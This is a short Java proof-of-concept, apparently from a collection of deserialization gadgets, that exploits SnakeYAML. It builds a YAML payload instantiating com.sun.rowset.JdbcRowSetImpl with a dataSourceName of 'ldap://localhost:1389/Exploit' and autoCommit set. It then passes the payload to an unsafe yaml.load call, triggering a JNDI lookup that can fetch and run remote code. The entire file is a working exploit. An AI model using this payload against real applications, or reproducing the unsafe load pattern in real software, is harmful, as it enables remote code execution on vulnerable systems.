package AvailableGadgets;

import org.yaml.snakeyaml.Yaml;

// JdbcRowSetImpl 的可用 gadget
public class JdbcRowSetImplEXP {
    public static void main(String[] args) {
        String payload = "!!com.sun.rowset.JdbcRowSetImpl\n " +
                "dataSourceName: \"ldap://localhost:1389/Exploit\"\n" +
                " autoCommit: true";
        Yaml yaml = new Yaml();
        yaml.load(payload);
    }
}
